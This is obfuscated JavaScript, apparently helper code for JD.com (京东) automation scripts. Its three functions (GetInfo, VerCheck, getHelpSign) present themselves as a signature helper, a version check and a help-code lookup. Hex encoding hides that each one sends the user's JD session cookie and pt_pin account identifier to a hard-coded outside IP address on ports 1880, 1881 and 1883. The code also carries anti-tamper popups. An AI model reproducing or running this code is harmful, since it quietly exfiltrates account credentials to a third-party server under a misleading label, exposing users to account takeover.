__Oxe02bc=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x31\x2F\x67\x65\x74\x48\x35\x73\x74\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x69\x64\x73\x74\x72\x3D","","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x6C\x6F\x67","\x6E\x61\x6D\x65","\x20\x41\x50\x49\u8BF7\u6C42\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u7F51\u8DEF\u91CD\u8BD5","\u4EAC\u4E1C\u670D\u52A1\u5668\u8FD4\u56DE\u7A7A\u6570\u636E","\x6C\x6F\x67\x45\x72\x72","\x70\x6F\x73\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function GetInfo(_0x7971x2,_0x7971x3,_0x7971x4,_0x7971x5,_0x7971x6,_0x7971x7,_0x7971x8){return  new Promise(async (_0x7971x9)=>{const _0x7971xa={url:`${__Oxe02bc[0x0]}`+ _0x7971x2,headers:{"\x65\x6E\x74\x73":_0x7971x3,"\x62\x6F\x64\x79":_0x7971x4,"\x66\x69\x6E\x67\x65\x72\x70\x72\x69\x6E\x74":_0x7971x5,"\x66\x75\x6E\x63\x74\x69\x6F\x6E\x69\x64":_0x7971x6,"\x63\x6F\x6F\x6B\x69\x65":cookie,"\x6D\x65\x74\x68\x6F\x64":_0x7971x7,"\x70\x74\x5F\x70\x69\x6E":_0x7971x8}};$[__Oxe02bc[0x8]](_0x7971xa,(_0x7971xb,_0x7971xc,_0x7971xd)=>{try{if(_0x7971xb){console[__Oxe02bc[0x3]](`${__Oxe02bc[0x1]}${JSON[__Oxe02bc[0x2]](_0x7971xb)}${__Oxe02bc[0x1]}`);console[__Oxe02bc[0x3]](`${__Oxe02bc[0x1]}${$[__Oxe02bc[0x4]]}${__Oxe02bc[0x5]}`)}else {if(_0x7971xd){}else {console[__Oxe02bc[0x3]](`${__Oxe02bc[0x6]}`)}}}catch(e){$[__Oxe02bc[0x7]](e,_0x7971xc)}finally{_0x7971x9(_0x7971xd)}})})}(function(_0x7971xe,_0x7971xf,_0x7971x10,_0x7971x11,_0x7971x12,_0x7971x13){_0x7971x13= __Oxe02bc[0x9];_0x7971x11= function(_0x7971x14){if( typeof alert!== _0x7971x13){alert(_0x7971x14)};if( typeof console!== _0x7971x13){console[__Oxe02bc[0x3]](_0x7971x14)}};_0x7971x10= function(_0x7971x15,_0x7971xe){return _0x7971x15+ _0x7971xe};_0x7971x12= _0x7971x10(__Oxe02bc[0xa],_0x7971x10(_0x7971x10(__Oxe02bc[0xb],__Oxe02bc[0xc]),__Oxe02bc[0xd]));try{_0x7971xe= __encode;if(!( typeof _0x7971xe!== _0x7971x13&& _0x7971xe=== _0x7971x10(__Oxe02bc[0xe],__Oxe02bc[0xf]))){_0x7971x11(_0x7971x12)}}catch(e){_0x7971x11(_0x7971x12)}})({})

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdcb86=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x56\x65\x72\x43\x68\x65\x63\x6B\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x76\x65\x72\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\u7248\u672C\u4FE1\u606F\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x6C\x6F\x67","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x20\x20\u6700\u65B0\u7248\u672C\x3A","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5EFA\u8BAE\u62C9\u53D6\u811A\u672C\u83B7\u53D6\u65B0\u7248\u672C","\x20\x20\u6700\u65B0\u7248\u672C\x3A\u83B7\u53D6\u5931\u8D25\x21","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function VerCheck(_0x89aax2,_0x89aax3){return  new Promise((_0x89aax4)=>{$[__Oxdcb86[0x10]]({url:`${__Oxdcb86[0x0]}${_0x89aax2}${__Oxdcb86[0x1]}${_0x89aax3}${__Oxdcb86[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x89aax5,_0x89aax6,_0x89aax7)=>{try{_0x89aax7= JSON[__Oxdcb86[0x3]](_0x89aax7);if(_0x89aax7[__Oxdcb86[0x4]]=== 100){if(_0x89aax3=== _0x89aax7[__Oxdcb86[0x5]]){console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0x8]+ Ver);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xb]+ _0x89aax7[__Oxdcb86[0x5]]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xd]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}catch(e){$[__Oxdcb86[0xf]](__Oxdcb86[0xe],e)}finally{_0x89aax4(_0x89aax7)}})})}(function(_0x89aax8,_0x89aax9,_0x89aaxa,_0x89aaxb,_0x89aaxc,_0x89aaxd){_0x89aaxd= __Oxdcb86[0x11];_0x89aaxb= function(_0x89aaxe){if( typeof alert!== _0x89aaxd){alert(_0x89aaxe)};if( typeof console!== _0x89aaxd){console[__Oxdcb86[0x7]](_0x89aaxe)}};_0x89aaxa= function(_0x89aaxf,_0x89aax8){return _0x89aaxf+ _0x89aax8};_0x89aaxc= _0x89aaxa(__Oxdcb86[0x12],_0x89aaxa(_0x89aaxa(__Oxdcb86[0x13],__Oxdcb86[0x14]),__Oxdcb86[0x15]));try{_0x89aax8= __encode;if(!( typeof _0x89aax8!== _0x89aaxd&& _0x89aax8=== _0x89aaxa(__Oxdcb86[0x16],__Oxdcb86[0x17]))){_0x89aaxb(_0x89aaxc)}}catch(e){_0x89aaxb(_0x89aaxc)}})({})

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe36e0=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x33\x2F\x77\x77\x6C\x79\x68\x7A\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x68\x65\x6C\x70\x43\x6F\x64\x65\x3D","","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function getHelpSign(_0x50a3x2,_0x50a3x3,_0x50a3x4){return  new Promise((_0x50a3x5)=>{$[__Oxe36e0[0x6]]({url:`${__Oxe36e0[0x0]}${_0x50a3x2}${__Oxe36e0[0x1]}${_0x50a3x4}${__Oxe36e0[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0x50a3x3,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x50a3x6,_0x50a3x7,_0x50a3x8)=>{try{_0x50a3x8= JSON[__Oxe36e0[0x3]](_0x50a3x8)}catch(e){$[__Oxe36e0[0x5]](__Oxe36e0[0x4],e)}finally{_0x50a3x5(_0x50a3x8)}})})}(function(_0x50a3x9,_0x50a3xa,_0x50a3xb,_0x50a3xc,_0x50a3xd,_0x50a3xe){_0x50a3xe= __Oxe36e0[0x7];_0x50a3xc= function(_0x50a3xf){if( typeof alert!== _0x50a3xe){alert(_0x50a3xf)};if( typeof console!== _0x50a3xe){console[__Oxe36e0[0x8]](_0x50a3xf)}};_0x50a3xb= function(_0x50a3x10,_0x50a3x9){return _0x50a3x10+ _0x50a3x9};_0x50a3xd= _0x50a3xb(__Oxe36e0[0x9],_0x50a3xb(_0x50a3xb(__Oxe36e0[0xa],__Oxe36e0[0xb]),__Oxe36e0[0xc]));try{_0x50a3x9= __encode;if(!( typeof _0x50a3x9!== _0x50a3xe&& _0x50a3x9=== _0x50a3xb(__Oxe36e0[0xd],__Oxe36e0[0xe]))){_0x50a3xc(_0x50a3xd)}}catch(e){_0x50a3xc(_0x50a3xd)}})({})
